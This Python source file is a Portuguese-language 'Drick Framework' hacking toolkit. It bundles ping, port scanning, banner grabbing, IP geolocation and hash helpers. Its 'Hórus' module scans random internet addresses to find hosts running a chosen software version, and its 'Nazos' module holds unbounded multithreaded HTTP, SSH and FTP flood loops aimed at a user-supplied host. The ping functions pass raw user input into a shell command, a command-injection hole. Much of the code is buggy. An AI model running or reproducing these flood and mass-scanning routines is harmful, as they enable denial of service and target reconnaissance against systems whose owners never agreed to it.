


########### Reload - Nivel Maçon 1.7 ############


# Desenvolvido por Wandrew Tischler





import time
import random
import socket
import os
import requests
import threading
import hashlib
import string
import re
import urllib
import platform
import json
from urllib import request






######## Funções ########




#### Testar host ON/OFF

def ping():
	host = input("\n[#] Host >> ")
	response = os.system("ping -c 1 " +  host)
	print ("\n")
	if response == 0:
		fff = "\033[32m ✓ \033[0;0m"
		print (fff, host, "está online.\n")
	else:
		fff = "\033[31m X \033[0;0m"
		print (fff, host, "está offline ou inacessível.\n")
	
	
	
#### Capturar IP

def cap_ip():
	try:
		ent = input("\n[#] Host >> ")
		ip = socket.gethostbyname(ent)
		ip = "\033[32m" + ip + "\033[0;0m"
		capt = ("\nIP: ")
		print (capt, ip)
	except:
		print("\nComando inválido.")
	



#### Testar porta especifica

def porth():
    try:
    	host = input("\n[#] IP >> ")
    	port = int(input("[#] Porta >> "))
    	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    	if sock.connect_ex((host,port)):
    		str = "\033[31mestá fechada. \033[0;0m"
    		print ("\nPorta", port, str)
    	else:
    		str = "\033[32mestá aberta. \033[0;0m"
    		print ("\nPorta", port, str)
    except:
    	print("\nComando inválido.")
    	
    	


#### Localizador de IP

def geo_ip():
		print("\nLembre-se do protocolo HTTP / HTTPS.")
		host = input("\n[#] Host>> ")
		api = "http://ip-api.com/"
		host = api + host
		print("\n\n")
		r = requests.get(host)
		r = r.text
		print (r, "\n")





##### Capturar Banner

def cap_ban():
	host = input("\n[#] IP  >> ")
	porta = int(input("[#] Porta >> "))

	if porta == 20:
		s = socket.socket()
		s.settimeout(3)
		s.connect((host, porta))
		rf = s.recv(1030)
		print ("\033[32m" + "\nBanner capturado" + "/033[0;0m", rf, "\n")
	
	
	if porta == 21:
		s = socket.socket()
		s.settimeout(3)
		s.connect((host, porta))
		rf = s.recv(1030)
		print ("\033[32m" + "\nBanner capturado" + "/033[0;0m", rf, "\n")

	if porta == 22:
		s = socket.socket()
		s.settimeout(3)
		s.connect((host, porta))
		rf = s.recv(1030)
		print ("\033[32m" + "\nBanner capturado" + "/033[0;0m", rf, "\n")
		
	if porta == 80:
		s = socket.socket()
		s.connect((host, porta))
		s.send(b'GET /\n\n')
		print("\n")
		print(s.recv(10000))

		
	if porta == 443:
		s = socket.socket()
		s.connect((host, porta))
		s.send(b'GET /\n\n')
		print("\n")
		print(s.recv(10000))
		
	else:
		print("  ")





##### Scanner de Portas:
	
# UPGRADE DESSE SCANNER

def port_scan():
	print("\n     ____SCANNER DE PORTAS____\n")
	
	
	host = input("[#] IP >> ")


	portas = [20, 21, 22, 23, 25, 53, 67, 68, 80, 110, 123, 143, 156, 161, 179, 443, 1723, 3128, 3389]



	print("\n")
	xz = ""
	for ports in portas:
		if ports == 20:
			x = "• FTP"
		if ports == 21:
			x = "• FTP"
		if ports == 22:
			x = "• SSH"
		if ports == 23:
			x = "• TELNET"
		if ports == 25:
			x = "• SMTP"
		if ports == 53:
			x = "• DNS"
		if ports == 67:
			x = "• DHCP SRV"
		if ports == 68:
			x = "• DHCP CLI"
		if ports == 80:
			x = "• HTTP"
		if ports == 110:
			x = "- POP3"
		if ports == 123:
			x = "- NTP"
		if ports == 143:
			x = "- IMAP4"
		if ports == 156:
			x = "- SQL"
		if ports == 161:
			x = "- SNMP"
		if ports == 179:
			x = "- BGP"
		if ports == 443:
			x = "- HTTPS"
		if ports == 1723:
			x = "+ PPTP"
		if ports == 3128:
			x = "+ SQUID"
		if ports == 3389:
			x = "+ TERMINAL SERVER"
		
			
			
		print ("TESTANDO: ", ports, "\033[33m         ", x,"\033[0;0m")

		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(0.7)

		if s.connect_ex((host, ports)) == 0:
			print ("\nPORTA", ports, "\033[32m", "ABERTA\n", "\033[0;0m")





############# Elink

def link_extrator():

	print("\n\n\n          --------- E-Link | Extrator de links\n\n\n")
	host = input("[#] Site >> ")
	link1 = []
	host = "http://" + host
	response = requests.get(host)
	content = str(response.content)
	content = content.split(" ")
	cont = 0

	for n in content:
		if "http://"  in n:
			n = n
			if 'href="' in n:
				n1 = n.replace('href="', '')
				link1.append(n1)
				cont += 1
		if "https://"  in n:
			n = n
			if 'href="' in n:
				n2 = n.replace('href="', '')
				link1.append(n2)
				cont += 1


	print("\n\n\n")
	nn1 = 0
	linkz = []
	for link in link1:
		nn1 += 1
		g = 0

		for letra in link:
			g += 1
			if '"' in letra:
				nn = g
				nn = nn - 1
				final = (link[:nn])
				print("\n", final, "\n")
				linkz.append(final)
	print ("\n\n", len(link1), "links indexados.\n\n\n")






def gmax():
	print("\n   >>>> GMAX (GERADOR DE NÚMEROS RANDÔMICOS)")
	try:
		inp = input("\n\nQuantos numeros?: ")
		print("\n")
		inp = int(inp)
		ip = 0
		while ip < inp:
			a = (random.randint(21,27))
			b = (random.randint(992,999))
			c = (random.randint(100,999))
			d = (random.randint(100,999))
			ip += 1
			soma = [a,b,c,d]
			soma = str(soma)
			msg = (' telelefone N°:')
			nume = soma.replace(",", "")
			nume = nume.replace(' ', '')
			nume = nume[1:-1]
			xtc = "\033[33m" + nume + "\033[0;0m"
			print (xtc, msg, ip)
			
	except:
		print("\nComando Inválido.")






############### PROJETO - HÓRUS ############



####### Função 1 #######

def hórus():
	
	def func1(porta, disp):
		global dd
		global x
		
		lista = []
		
		def test_b(host):
			global dd
			global x
			
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			result = sock.connect_ex((host, porta))
			if result == 0:
				dd += 1
				print(host, "porta", porta, "\033[32m", "aberta", "\033[0;0m", dd)
				if dd == disp:
					x = False
				lista.append(host)
		
		def capturarh():
			a = (random.randint(1,250))
			b = (random.randint(1,200))
			c = (random.randint(1,200))
			d = (random.randint(1,200))
			soma = a,b,c,d
			soma = str(soma)
			host = soma.replace(",", ".")
			host = host.replace(' ', '')
			host = host[1:-1]
			try:
				test_b(host)
			except:
				print("NOVO ERRO")
		
		dd = 0
		x = True
		threads = []
		
		while x == True:
			time.sleep(0.007)
			try:
				t = threading.Thread(target=capturarh)
				try:
					threads.append(t)
					t.start()
				except:
					continue
			except:
				continue
		
		time.sleep(7)
		print("\n\n\n\n")
		print("Dispositivos Rastreados")
		print("\n\n")
		dg = 0
		for l  in lista:
			dg += 1
			l = "\033[32m" + l + "\033[0;0m"
			print("IP: ", l, " N°", dg)
			

																		
	############ FUNCAO 2 ##########
	

	listah = []    #   !!!!!!
	
	
	global tru
	tru = True
	
	global contador
	contador = 0
		
	
	##### 4
	
	def bannner(host, porta):
		global tru
		global contador
		
		host = host
		porta = porta
		
		
		if porta == 20:
			s = socket.socket()
			s.settimeout(3)
			s.connect((host, porta))
			rf = s.recv(1030)
			print ("\033[32m" + "\nBanner capturado" + "\033[0;0m", rf, "\n")
			
			
		
		######### FTP ########
		if porta == 21:
			s = socket.socket()
			s.settimeout(3)
			s.connect((host, porta))
			rf = s.recv(1030)
			print ("\033[32m" + "\nBanner capturado" + "\033[0;0m", rf, "\n")
			
			rf = str(rf)
			programa = servico.upper()
			banner = rf.upper()
			
			tkx = programa.split(" ")
			software = tkx[0]

			
			if versao == "0" or "x":
				if software in banner:
					contador += 1
					print("Software: ", software, " encontrado ✓", "N° ", contador)
					finali = host + " - " + banner
					listah.append(finali)
					if contador == disp:
						tru = False
			else:
				if software in banner:
					if versao in banner:
						contador += 1
						print("Versão: ", versao, " encontrado do software: ", software, "N° ", contador)
						finali = host + " - " + banner
						listah.append(finali)
						if contador == disp:
							tru = False
			
		
			
		#### Secure Shell [SSH]
		
		if porta == 22:
			s = socket.socket()
			s.settimeout(3)
			s.connect((host, porta))
			rf = s.recv(1030)
			print ("\033[32m" + "\nBanner capturado" + "\033[0;0m", rf, "\n")
			
			rf = str(rf)
			programa = servico.upper()
			banner = rf.upper()
			
			tkx = programa.split(" ")
			software = tkx[0]

			
			if versao == "0":
				if software in banner:
					contador += 1
					print("Software: ", software, " encontrado ✓", "N° ", contador)
					finali = host + " - " + banner
					listah.append(finali)
					if contador == disp:
						tru = False
			else:
				if software in banner:
					if versao in banner:
						contador += 1
						print("Versão: ", versao, " encontrado do software: ", software, "N° ", contador)
						finali = host + " - " + banner
						listah.append(finali)
						if contador == disp:
							tru = False


			
		
		##### HTTP / HTTPS ######
		if porta == 80 or 443:
			s = socket.socket()
			s.connect((host, porta))
			s.send(b'GET /\n\n')
			rf = s.recv(1030)
			print ("\033[32m" + "\nBanner ca777pturado " + "\033[0;0m", "IP: ", host, "   ", rf, "\n")
			
			
			rf = str(rf)
			programa = servico.upper()
			banner = rf.upper()
			
			tkx = programa.split(" ")
			software = tkx[0]

			
			if versao == "0":
				if software in banner:
					contador += 1
					print("Software: ", software, " encontrado ✓", "N° ", contador)
					finali = host + " - " + banner
					listah.append(finali)
					if contador == disp:
						tru = False
			else:
				if software in banner:
					if versao in banner:
						contador += 1
						print("Versão: ", versao, " encontrado do software: ", software, "N° ", contador)
						finali = host + " - " + banner
						listah.append(finali)
						if contador == disp:
							tru = False
					
				
					
					

		
			
	###### 3
	def test_bc(host):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		result = sock.connect_ex((host, porta))
		if result == 0:
			
			#print(host, "porta", porta, "\033[32m", "aberta", "\033[0;0m")
			
			bannner(host, porta)

	
	
		
	##### 2	
	def capturarh():
		a = (random.randint(1,250))
		b = (random.randint(1,200))
		c = (random.randint(1,200))
		d = (random.randint(1,200))
		soma = a,b,c,d
		soma = str(soma)
		host = soma.replace(",", ".")
		host = host.replace(' ', '')
		host = host[1:-1]
		try:
			test_bc(host)
		except:
			popi = 1 + 1 #        : )
	
	
	####### 1
	def func2(servico, porta, disp, versao):
		threads = []
		
		
		while tru == True:
			time.sleep(0.05)
			try:
				t = threading.Thread(target=capturarh)
				try:
					threads.append(t)
					t.start()
				except:
					continue
			except:
				continue
		
		
		
		
		
		time.sleep(7)
		xxc = "          " * 30
		print(xxc)
			
			
		for n in listah:
			print("\nIP: ", "\033[33m" + n + "\033[0;0m")
		
	

    ########### Final das Funcoes Hórus ##########
	
	rt52 = "\033[36m" + "HÓRUS" + "\033[0;0m"
	print("\n*   *  *    *     *      *   *       *      *      *     *  ")
	print(" *  *      *  [][][][]--(((̲̅=̲̲̅̅̅̅●̲̅̅))))--[][][][]  *  *   *   *")
	print("   *         *           .  .  .   *       *      *     * ")
	print("      *  *       *      .   .   .     *   *    *  *   *")
	print("  *     *    *  *      .    .    .  *   *   *       *    *")
	print("\n_---_-___---_-___--_-- _---_---_---_-___-- _---_-___---__--")
	print("_---_-_-___---_--_--_-_-_-", rt52, "-___---_-______---_-____")
	print(" _---_-__- _-_ ---_ - _ __ -- ___ _---_- [BETA] _-- _---_-_-\n")
	print("             \033[36mEsse programa deveria ser secreto.\033[0;0m\n\n\n")
	
	xx = True
	while xx == True:
		inp = input("\n|______ : ")
		
		if inp == "sair":
			xx = False
			
		elif inp == "1":
			print("\n    LOCALIZADOR DE PORTAS ONLINE\n")
			porta = int(input("PORTA: "))
			disp = int(input("N° DE DISPOSITIVOS: "))
			print("\n\n")
			func1(porta, disp)
		
		elif inp == "2":
			print("\n    LOCALIZADOR DE SOFTWARE EM PORTA\n")
			print("Use ", "\033[32m[0]\033[0;0m", "para não especificar uma versão\n\n")
			servico = input("SERVIÇO / S.O: ")
			porta = int(input("PORTA: "))
			disp = int(input("N° DE DISPOSITIVOS: "))
			versao = str(input("VERSÃO: "))
			print("\n\n")
			func2(servico, porta, disp, versao)


			
		elif inp == "4":
			break


		elif inp == " " or " ":
			print("\n\nESSE COMANDO NÃO EXISTE.\nEsta é a lista de comandos existentes:\n\n\n[ 1 ] Localizar portas abertas.\n[ 2 ] Localizar software / versão em porta\n[ 4 ] Sair do programa")





############## NAZOS #################


def nazos():
	print("  \n\n  [ ∆ ] NAZOS - Avaliação de Portas por Informação Passiva. \n")

	print("[1] HTTP Flood\n[2] Secure Shell \n[3] FTP ATAQUE\n\n[4] Monitorar Tempo de Resposta")

	x = True

	while x == True:
		
		entx = input("\n----> ")

	
		if entx == "1":

			print("\n[1] HTTP ATAQUE")
			
			host = input("\n[#] Endereço www. >> ")
			host = "http://www." + host
			porta = input("[#] PORTA: ")

				
			global zz
			zz = 0

			def thred():
					
					
				global zz
					
				x = 0
				zz += 1
					
					
				while x < 1:
					x += 1
					r = requests.get(host)
					r = str(r)
					if r == "<Response [200]>":
						print("Host ativo (recebendo pacote)", zz)
					if r == "<Response [429]>":
						print("Host negando conexão", zz)
				
			threads = []
			test = 0
			while True:
				time.sleep(0.009)
				try:
					test += 1
					t = threading.Thread(target=thred)
					threads.append(t)
					t.start()
				except:
					#print("1 exceção / continue")
					a = 1
					continue
					
					
					
 

########## SSH ###########

		if entx == "2":
			print("\nSecure Shell\n")
			
			host = input("\n[#] Host >> ")
			host = host
			porta = 22
			

			print("\n")
			
			global con2
			con2 = 0
			
			

			def thred():
					global con2
					con2 += 1
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.settimeout(3)
					result = sock.connect_ex((host, porta))
					if result == 0:
						print(host, "porta", porta, "\033[32m", "aberta", "\033[0;0m", "N = ", con)
					else:
						print("Host não responde")
				
			threads = []
			while True:
				#time.sleep(0.01)
				try:
					t = threading.Thread(target=thred)
					threads.append(t)
					t.start()
				except:
					continue
		

		

		if entx == "3":
			print("\nFTP\n")
			
			host = input("\n[#] Host >> ")
			host = host
			porta = 21
				
			global conn
			conn = 0

			print("\n")

			def thred():
				#time.sleep(0.2)
				global conn
				conn += 1
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.settimeout(3)
				result = sock.connect_ex((host, porta))
				if result == 0:
					print(host, "porta", porta, "\033[32m", "aberta", "\033[0;0m", "N = ", conn)
				else:
					print("Host não responde")
				
			threads = []
			while True:
				#time.sleep(0.01)
				try:
					t = threading.Thread(target=thred)
					threads.append(t)
					t.start()
				except:
					continue

			
		if entx == "4":
			print("\nMONITORAMENTO [TEMPO DE RESPOSTA]")
			host = input("\n[#] Host >> ")
			print("\n")
			while True:
				time.sleep(0.3)
				response = os.system("ping -c 1 " +  host)
				print ("\n")
	
	

def infosys():
	   	print("\n ------------------ infoSyS Project -----------------\n")
	   	###### Capturar IP ######
	   	url = request.urlopen('http://ip-api.com/json').read()
	   	jsn = json.loads(url.decode('UTF-8'))
	   	ipmaq = jsn['query']
	   	print(" IP Local: ", ipmaq)
	   	api = "http://ip-api.com/"
	   	host = api + ipmaq
	   	print("\n\n")
	   	r = requests.get(host)
	   	r = r.text
	   	print (r)
	   	####
	   	print("\n")
	   	print("  Sistema: n.", platform.system())
	   	print("  Versão: ", platform.release())
	   	print("  Processador: ", platform.machine())
	   	print("  Nome / Rede: ", platform.node())
	   	print("\n\n\n")











###################################################################################################################################################
###################################################################################################################################################









nomep = "\033[36m" + "DRICK FRAMEWORK" "\033[0;0m"

print("\n\n##############  ##### ########  ########  ######## # #")
print ("####### ### ### ##### --|", nomep, "|-- ###########\033[32m v[1.2] \033[0;0m#############################################\n\n")




ma = (random.randint(1, 20))
listag = ["kkefkwfkwfgekgk ","Na verdade oque vale a pena?", "Não compre terrenos na lua.", "Olá meu nome é Wandrew e atualmente tenho 18 anos. Oi futuro.", "Não se julgue quando não precisa, tente se divertir quando possível.", "Use o camando /limpar.", "Se voce se torna um mago quando empunha uma varinha magica voce tambem vira um hacker de posse do programa Drick Framework.", "Obrigado pela preferência.", "Em 2038, às 3 horas, 14 minutos e 5 segundos de 19 de março, os computadores que estiverem usando sistemas de 32-bit não conseguirão lidar com a mudança de data, pois terão atingido seu limite máximo de contagem.", "Beba agua.", "Use o Hórus para adquirir endereços IP online com especificação de programas, portas e versões operando na rede de computadores privada ou global.", "777 ", "Não use com moderação.", "O código fonte está cheio de gambiarras, eu se, más está rodando.", "Cuidado voce pode está sendo espionado(a) agora", "666", "888", "..."]

fgh = "\033[31m" + " [+]" + "\033[0;0m"

if ma == 1:
	print(fgh, listag[1])
elif ma == 2:
	print(fgh, listag[2])
elif ma == 3:
	print(fgh, listag[3])
elif ma == 4:
	print(fgh, listag[4])
elif ma == 5:
	print(fgh, listag[5])
elif ma == 6:
	print(fgh, listag[6])
elif ma == 7:
	print(fgh, listag[7])
elif ma == 8:
	print(fgh, listag[8])
elif ma == 9:
	print(fgh, listag[9])
elif ma == 10:
	print(fgh, listag[10])
elif ma == 11:
	print(fgh,listag[11])
elif ma == 12:
	print(fgh,listag[12])
elif ma == 13:
	print(fgh,listag[13])
elif ma == 14:
	print(fgh,listag[14])
elif ma == 15:
	print(fgh,listag[15])
elif ma == 16:
	print(fgh,listag[16])
elif ma == 17:
	print(fgh,listag[17])
elif ma == 18:
	print(fgh,listag[18])

	
	
	
	
	
strr = "\033[33m" + "[+]" + "\033[0;0m"

print("\n\n")
print(" ", strr ,"Use (/c) para listar os comandos.")
print(" ", strr, "Use (/info) para mais informações.\n\n\n")







###############################################################################################################







x = True

while x == True:
	
	y = input("\n[\033[33m#\033[0;0m] >> ")
	
	# Comando para fechar o programa
	if y == "/sair":		
		x = False
	
	# Trata entradas direras
	elif y[0] == "!":
		teste = y.replace(" ", ",")
		print(teste)
		
	
	
		
	elif y == "/c":
		print("\n\n\nPARA USAR UMA FERRAMENTA UTILIZE O COMANDO ENTRE PARENTESES.\n \n\n[#] COMANDOS USUAIS:\n\nPing Host                               (\033[32mping\033[0;0m)\nCapturar IP                             (\033[32mcap ip\033[0;0m)\nTestar porta                            (\033[32mtporta\033[0;0m)\nCapturar banner                         (\033[32mcbanner\033[0;0m)\nLocalizar IP                            (\033[32mlocip\033[0;0m)\nGmax gerador                            (\033[32mgmax\033[0;0m)\nExtrator de Links                       (\033[32melink\033[0;0m)\nHórus                                   (\033[32mhorus\033[0;0m)\nExpor codigo-fonte                      (\033[32mcfonte\033[0;0m)\nEscaner de Portas                       (\033[32mpscan\033[0;0m)\nNazos                                   (\033[32mnazos\033[0;0m)\nInformações do Sistema                  (\033[32minfosys\033[0;0m)")
		
		print("\n\n[#] Funções HASH")
		
		print("\nEncriptar em MD5                        (\033[32mmd5\033[0;0m)\nEncriptar em SHA-1                      (\033[32msha1\033[0;0m)\nEncriptar em SHA-224                    (\033[32msha224\033[0;0m)\nEncriptar em SHA-256                    (\033[32msha256\033[0;0m)\nEncriptar em SHA-384                    (\033[32msha384\033[0;0m)\nEncriptar em SHA-512                    (\033[32msha512\033[0;0m)")

	
		
		
				
	elif y == "/info":
		print("\n\n                      \033[32mDRICK FRAMEWORK\033[0;0m")
		print("\n O software (Drick Framework) é um pacote com vários algoritimos essênciais para um bom pentesting e uma boa análise de um sistema ou rede, o nosso software busca sempre agrupar as melhores alternativas para uma boa análise e uma rede de testes.\n")
		print("\n\n                    \033[32mCOMANDOS ADICIONAIS\033[0;0m")
		print("\n1 - Caso queira consultar alguma informação a respeito de algum programa da plataforma use o comando (/info) + Programa, por exemplo (/info ping), este comando retornará as principais informações sobre o mesmo.\n\n2 - Caso deseje fechar a framework utilize o comando (/sair)\n\n3 - Utilize o comando (/limpar) para limpar a tela.")
		
		
		
		
		
		
		
	#requisitar informações de determinadas funções
	
	elif y == "/info ping":
		print("\n\033[32m PING\n\033[0;0m\nPING é um algoritimo usado para testar uma máquina remota afim de determinar se ela está online ou offline e obter dados de sua requisição como tempo de resposta.")
	
	elif y == "/info cap ip":
		print("\n\033[32m CAP IP (CAPTURAR IP)\n\033[0;0m\nCAP IP tem como função obter o endereço remoto de uma determinada máquina na rede, o algoritimo captura o ip (Internet Protocol) através de uma requisição.")
	
	elif y == "/info tporta":
		print("\n\033[32m TPORTA (TESTAR PORTA)\n\033[0;0m\nTPORTA é um testador de porta específica nativo da plataforma, basicamente ele testa se uma determinada porta de um dispositivo na rede está aberta ou fechada.")
	
	elif y == "/info localizar ip":
		print("\n\033[32m LOCALIZAR IP\n\033[0;0m\nEsta função lhe permite rastrear um dispositivo e obter características de sua localização.")
	
	elif y == "/info cbanner":
			print("\n\033[32m CBANNER (CAPTURAR BANNER)\n\033[0;0m\nApartir de requisições ao alvo é possível obter o serviço e sua versão que está a rodar em uma determinada porta com esta informação é possível obter um exploit.")
		
	
	elif y == "/info elink":
		print("\n\033[32m ELINK (Extraidor de Link)\n\033[0;0m\nEsse algoritimo tem como função extrair links de uma determinada página na web.")
	
	elif y == "/info pscan":
		print("\n\033[32m PSCAN (Scanner de Portas)\n\033[0;0m\nPSCAN é um scanner de portas simples que tem o intuito de testar as principais portas de um host e determinar se as mesmas estão abertas ou fechadas.")
	

		
	elif y == "/info md5":
			print("\n\033[32m MD5\n\033[0;0m\nO MD5 (Message-Digest algorithm 5) é uma função de dispersão criptográfica (ou função hash criptográfica) de 128 bits unidirecional, por ser um algoritmo unidirecional, uma hash md5 não pode ser transformada novamente no texto que lhe deu origem.")
		
	
	elif y == "/info sha1":
		print("\n\033[32m SHA-1\n\033[0;0m\nEm criptografia, SHA-1 é uma função de dispersão criptográfica (ou função hash criptográfica) projetada pela Agência de Segurança Nacional dos Estados Unidos e é um Padrão Federal de Processamento de Informação dos Estados Unidos publicado pelo Instituto Nacional de Padrões e Tecnologia (NIST).SHA-1 produz um valor de dispersão de 160 bits (20 bytes) conhecido como resumo da mensagem. Um valor de dispersão SHA-1 é normalmente tratado como um número hexadecimal de 40 dígitos.")
	
	elif y == "/info sha224":
		print("\n\033[32m SHA-224\n\033[0;0m\n SHA-224 (224 bits) faz parte do conjunto de funções hash criptográficas SHA-2, desenvolvido pela Agência de Segurança Nacional dos EUA (NSA) e publicado em 2001 pelo NIST como um FIPS (Federal Information Processing Standard) dos EUA. Uma função hash é um algoritmo que transforma (hashes) um conjunto arbitrário de elementos de dados, como um arquivo de texto, em um único valor de tamanho fixo (o hash). O valor do hash computado pode então ser usado para verificar a integridade das cópias dos dados originais sem fornecer meios para derivar os dados originais. Irreversível, um valor de hash pode ser livremente distribuído, armazenado e usado para fins comparativos. SHA significa Secure Hash Algorithm. O SHA-2 inclui um número significativo de alterações em relação ao seu antecessor.")
	
	elif y == "/info cfonte":
		print("\n\033[32m CFONTE\n\033[0;0m\nCFONTE permite-nos fazer requisições de codigo fonte de uma determinada pagina na web.")
		
	elif y == "/info sha256":
		print("\n\033[32m SHA 256\n\033[0;0m\nSHA-256 é usado como parte do processo de autenticação de pacotes de software Debian GNU/Linux e no padrão DKIM de assinatura de mensagens, Várias criptomoedas como Bitcoin usam SHA-256 para verificar transações e calculam a prova-de-trabalho ou prova-de-participação (do inglês, proof of stake). A ascensão de chips aceleradores ASIC SHA-2 tem levado ao uso de esquemas de prova-de-trabalho baseados em scrypt.")
		
	elif y == "/info sha384":
		print("\n\033[32m SHA 384\n\033[0;0m\n SHA-384 é uma função do algoritmo criptográfico Sha-2, evolução de Sha-1 . É a mesma criptografia do Sha-512, exceto que a saída é truncada em 384 bits. Também há diferenças no processo de inicialização. Esta função faz parte do Padrão Federal de Processamento de Informações dos EUA.")
    
	elif y == "/info sha512":
		print('\n\033[32m SHA 512\n\033[0;0m\nSHA-512 é uma função do algoritmo criptográfico Sha-2, que é uma evolução do famoso Sha-1 . O Sha-512 está muito próximo do seu "irmão" Sha-256, exceto pelo uso de "blocos" de 1024 bits e aceita como entrada uma string de comprimento máximo de 2 ^ 128 bits. O Sha-512 também possui outras modificações algorítmicas em comparação com o Sha-256. Essa função criptográfica faz parte do Padrão Federal de Processamento de Informações dos EUA.')
	
	elif y == "/info horus":
		print("\n\033[32m HÓRUS\n\033[0;0m\nHÓRUS é um programa desenvolvido para identificar e rastrear dispositivos, serviços e sistemas operacionais na rede de computadores privada e global.")
	
	elif y == "/info infosys":
		print("\n\033[32m InfoSyS\n\033[0;0m\nInfoSyS de forma simples te ajuda a obter informações sobra maquina onde o software está rodando.")
		
		
		
		
			
		
	

	
	
	
	# Teste ON/OFF Host
	elif y == "ping":
		ping()
	
	# Capturar IP
	elif y == "cap ip":
		cap_ip()
		
	# Testar porta
	elif y == "tporta":
		porth()
	
	# Localizar IP
	elif y == "locip":
		geo_ip()
	
	# Capturar banner
	elif y == "cbanner":
		cap_ban()
	
		
	# Extrator de links
	elif y == "elink":
		link_extrator()
	
	# Scanner de portas
	elif y == "pscan":
		port_scan()
		
	# Limpar o console
	elif y == "/limpar":
		a = "           " * 10000
		print(a)
		
		
	# Retorna codigo fonte (WEB)
	elif y == "cfonte":
		print("\nLembre-se do protocolo HTTP / HTTPS.")
		host = input("\n[#] Host>> ")
		print("\n\n")
		r = requests.get(host)
		r = r.text
		print (r, "\n")
	
	# Gmax gerador de número movel
	elif y == "gmax":
		gmax()
	
	# PROJETO - HÓRUS
	elif y == "horus":
		hórus()

	elif y == "nazos":
		nazos()
	
	elif y == "infosys":
		infosys()
	
	
	
	
	
	
	###########  Hashs ##########
	elif y == "sha1":

		inp = input("\nEncriptar: ")
		def encrypt_string(hash_string):
			sha_signature = \
			hashlib.sha1(hash_string.encode()).hexdigest()
			return sha_signature
		hash_string = inp
		sha_signature = encrypt_string(hash_string)
		print("\n")
		print("Encriptado:")
		rs = "\033[32m" + sha_signature + "\033[0;0m"
		print("\n", rs)
		
		
	elif y == "sha224":
		
		inp = input("\nEncriptar: ")
		def encrypt_string(hash_string):
			sha_signature = \
			hashlib.sha224(hash_string.encode()).hexdigest()
			return sha_signature
		hash_string = inp
		sha_signature = encrypt_string(hash_string)
		print("\n")
		print("Encriptado:")
		rs = "\033[32m" + sha_signature + "\033[0;0m"
		print("\n", rs)

		
	elif y == "sha256":
		inp = input("\nEncriptar: ")
		def encrypt_string(hash_string):
			sha_signature = \
			hashlib.sha256(hash_string.encode()).hexdigest()
			return sha_signature
		hash_string = inp
		sha_signature = encrypt_string(hash_string)
		print("\n")
		print("Encriptado:")
		rs = "\033[32m" + sha_signature + "\033[0;0m"
		print("\n", rs)
				
		
	elif y == "sha384":
		inp = input("\nEncriptar: ")
		def encrypt_string(hash_string):
			sha_signature = \
			hashlib.sha384(hash_string.encode()).hexdigest()
			return sha_signature
		hash_string = inp
		sha_signature = encrypt_string(hash_string)
		print("\n")
		print("Encriptado:")
		rs = "\033[32m" + sha_signature + "\033[0;0m"
		print("\n", rs)
		
	elif y == "sha512":
		inp = input("\nEncriptar: ")
		def encrypt_string(hash_string):
			sha_signature = \
			hashlib.sha512(hash_string.encode()).hexdigest()
			return sha_signature
		hash_string = inp
		sha_signature = encrypt_string(hash_string)
		print("\n")
		print("Encriptado:")
		rs = "\033[32m" + sha_signature + "\033[0;0m"
		print("\n", rs)
	
	elif y == "md5":
		inp = input("\nEncriptar: ")
		def encrypt_string(hash_string):
			sha_signature = \
			hashlib.md5(hash_string.encode()).hexdigest()
			return sha_signature
		hash_string = inp
		sha_signature = encrypt_string(hash_string)
		print("\n")
		print("Encriptado:")
		rs = "\033[32m" + sha_signature + "\033[0;0m"
		print("\n", rs)
	
	
	
	# Trata as exceções
		
	elif y == " " or " ":
		print("\nESSE COMANDO NÃO EXISTE.")
		

